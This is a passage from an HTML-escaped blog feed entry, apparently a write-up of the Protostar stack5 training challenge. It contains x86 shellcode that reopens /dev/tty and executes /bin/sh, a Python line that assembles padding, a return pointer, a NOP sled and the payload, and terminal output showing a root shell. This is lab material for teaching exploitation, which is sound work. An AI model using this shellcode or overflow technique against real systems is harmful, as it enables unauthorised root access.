class=&quot;s&quot;&gt;/tty&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/dev&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x89&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xe3&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xc9&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x66&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xb9&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x12&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x27&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xb0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x05&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xcd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x80&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x6a&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x17&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x58&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xdb&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xcd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x80&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x6a&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x2e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x58&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x53&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xcd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x80&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xc0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x50&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;//sh&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x89&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xe3&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x50&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x53&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x89&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xe1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x99&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xb0&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x0b&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;xcd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returnPointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nop_sled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The return pointer can be any value that lands in the NOP sled.&lt;/p&gt;
+
+&lt;p&gt;As a consequence a shell is popped back to us:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@protostar:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python overflow_stack5_1.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | /opt/protostar/bin/stack5
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; was used to keep the stdin open and introduce commands that will be passed to the popped shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;HAPPY HACKING :)&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Target Binary</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/posts/protostar5.png" /><media:content medium="image" url="http://localhost:4000/assets/img/posts/protostar5.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
